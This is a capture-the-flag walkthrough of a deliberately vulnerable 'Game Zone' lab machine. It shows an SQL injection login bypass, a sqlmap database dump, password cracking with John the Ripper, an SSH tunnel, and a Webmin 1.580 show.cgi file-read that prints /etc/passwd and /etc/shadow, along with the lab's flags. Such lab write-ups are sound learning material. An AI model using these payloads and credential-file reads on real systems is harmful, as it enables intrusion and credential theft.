# Game Zone

---

IP = `10.10.174.58`


```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Task 1 - Deploy the vulnerable machine

> What is the name of the large cartoon avatar holding a sniper on the forum?

`Agent 47`

## Task 2 - Obtain access via SQLi

`SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -`

> When you've logged in, what page do you get redirected to?

`portal.php`

## Task 3 - Using SQLMap

![](https://i.imgur.com/ox4wJVH.png)

![](https://i.imgur.com/W5boKpk.png)

- -r uses the intercepted request you saved earlier
- --dbms tells SQLMap what type of database management system it is
- --dump attempts to outputs the entire database

```
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

```

```
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

```

> In the users table, what is the hashed password?

`ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

> What was the username associated with the hashed password?

`agent47`

## Task 4 - Cracking a password with JohnTheRipper

![](https://i.imgur.com/64g6Y8F.png)

- hash.txt - contains a list of your hashes (in your case its just 1 hash)
- --wordlist - is the wordlist you're using to find the dehashed value
- --format - is the hashing algorithm used. In our case its hashed using SHA256.

```
--SNIP--
videogamer124    (?)
--SNIP--
```

`agent47:videogamer124`

> What is the user flag?

`649ac17b1480ac13ef1e4fa579dac95c`

## Task 5 - Exposing services with reverse SSH tunnels

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

`-L` is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do `ssh -L 9000:imgur.com:80 user@example.com`. Going to `localhost:9000` on your machine, will load imgur traffic using your other server.

`-R` is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.

We will use a tool called `ss` to investigate sockets running on a host.

If we run `ss -tulpn` it will tell us what socket connections are running

| **Argument** | **Description**                    |
| ------------ | ---------------------------------- |
| \-t          | Display TCP sockets                |
| \-u          | Display UDP sockets                |
| \-l          | Displays only listening sockets    |
| \-p          | Shows the process using the socket |
| \-n          | Doesn't resolve service names      |

We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

From our local machine, run `ssh -L 10000:localhost:10000 <username>@<ip>`

ssh -L 10000:localhost:10000 agent47@10.10.174.58

Once complete, in your browser type "localhost:10000" and you can access the newly-exposed webserver.

![](https://i.imgur.com/9vJZUZv.png)

> What is the name of the exposed CMS?

`Webmin`

`agent47:videogamer124`

> What is the CMS version?

`1.580`

http://localhost:10000/

```

System hostname	gamezone (127.0.1.1)
Operating system	Ubuntu Linux 16.04.6
Webmin version	1.580
Time on system	Thu Sep 26 20:58:16 2024
Kernel and CPU	Linux 4.4.0-159-generic on x86_64
Processor information	Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz, 1 cores
System uptime	0 hours, 37 minutes
Running processes	127
CPU load averages	0.01 (1 min) 0.02 (5 mins) 0.04 (15 mins)
CPU usage	0% user, 1% kernel, 0% IO, 99% idle
Real memory	1.95 GB total, 386.30 MB used

Virtual memory	975 MB total, 0 bytes used

Local disk space	8.78 GB total, 2.83 GB used

Package updates	All installed packages are up to date
```

## Task 6 - Privilege Escalation with Metasploit

I looked online to see any sort of possible exploits, and I found one!

Its a Metasploit exploit

`Webmin 1.580 — ‘/file/show.cgi’ Remote Command Execution (Metasploit)`

However, since we didnt really need to use it, since we only needed the root flag, I decided to find it manually.

Digging into this exploit, I found the official documentation of it

http://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf

The documentation shows that adding `/file/show.cgi` to the URL allows you to read file locations (as root) when adding a file past the ‘show.cgi’

`http://localhost:10000/file/show.cgi/etc/passwd`

`http://localhost:10000/file/show.cgi/etc/shadow`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
agent47:x:1000:1000:agent47,,,:/home/agent47:/bin/bash
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
```

```
root:$6$Llhg4MdC$f9TRe8xLelwHpj5JvCNprpWBnHppEnryPo1mGiKW2U71SpTVZRRE0f7/3kZsIwNsRpcc7GlcVSnuYfiN5n7Yw.:18124:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
lxd:*:18122:0:99999:7:::
messagebus:*:18122:0:99999:7:::
uuidd:*:18122:0:99999:7:::
dnsmasq:*:18122:0:99999:7:::
sshd:*:18122:0:99999:7:::
agent47:$6$QRnDATVa$Dhv2K3GVe40X5hxB/vrdBeBDOYwtwGzFZfEL6/MdvOyO6S2w6pmaZy/h4j.3DKrCGtXoqkVTy.PDJsuOeZ6In1:18124:0:99999:7:::
mysql:!:18122:0:99999:7:::
```

> What is the root flag?

`a4b945830144bdd71908d12d902adeee`

http://localhost:10000/file/show.cgi/root/root.txt

`unshadow passwd shadow > creds.txt`
`head -n 1 creds.txt > root.txt`
`john --wordlist=/usr/share/wordlists/rockyou.txt root.txt`

`john --show root.txt`